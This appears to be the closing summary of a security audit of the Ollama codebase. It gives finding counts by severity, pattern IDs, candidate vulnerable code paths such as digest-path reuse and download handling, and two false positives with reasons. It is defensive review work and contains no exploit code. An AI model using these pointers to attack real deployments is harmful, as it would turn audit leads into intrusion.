Findings written: 14 (CRITICAL: 2, HIGH: 7, MEDIUM: 5)
Patterns added to registry: 9 (AP-001R, AP-002R, AP-035, AP-036, AP-037, AP-038, AP-039, AP-040, AP-041)
Variant candidates:
- x/mlxrunner/, x/agent/, server/internal/registry/ for digest-path reuse (AP-001R)
- server/download.go chunk bodies, x/imagegen/transfer response bodies (AP-002R)
- Other URL-following code paths (AP-035)
- x/imagegen/transfer/transfer.go parseAuthChallenge (AP-036)
- x/imagegen/transfer/download.go Range status check (AP-037)
- x/imagegen/transfer/download.go size-match cache (AP-038)
- Other OLLAMA_EXPERIMENT handlers (AP-041)

False positives with rationale recorded:
- H-01: save() hash-verifies before rename, blocking network-only substitution
- H-05: filepath.Walk does not descend into symlinked directories (stdlib guarantee)

Chamber closed: 2026-04-17T04:05:00Z
